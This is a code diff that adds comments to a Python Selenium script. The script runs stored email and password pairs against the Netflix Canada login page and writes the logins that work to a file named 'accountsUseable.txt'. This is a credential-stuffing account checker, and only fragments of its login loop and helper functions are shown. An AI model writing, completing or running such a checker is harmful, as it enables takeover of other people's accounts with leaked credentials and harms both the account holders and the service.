@@ -19,7 +19,7 @@ options.binary_location = r"C:\Program Files\Google\Chrome Beta\Application\chro
 
 
 
-
+# this is where the login is attempted
 
 def login(user, password, driver):
     time.sleep(10)
@@ -33,6 +33,7 @@ def login(user, password, driver):
     time.sleep(0.5)
     return driver.current_url
 
+# data saved here
 def saveData(accounts):
     file = open('accountsUseable.txt', 'w')
     for account in accounts:
@@ -41,6 +42,9 @@ def saveData(accounts):
 
 targetUrl = r'https://www.netflix.com/ca/login'
 check = 0
+
+
+# loop through all stored logins
 for user in data["email"]:
     print(f'[{check}/{len(data["email"])}]')
     B = webdriver.Chrome(f"{os.getcwd()}//driver//chromedriver.exe", chrome_options=options)
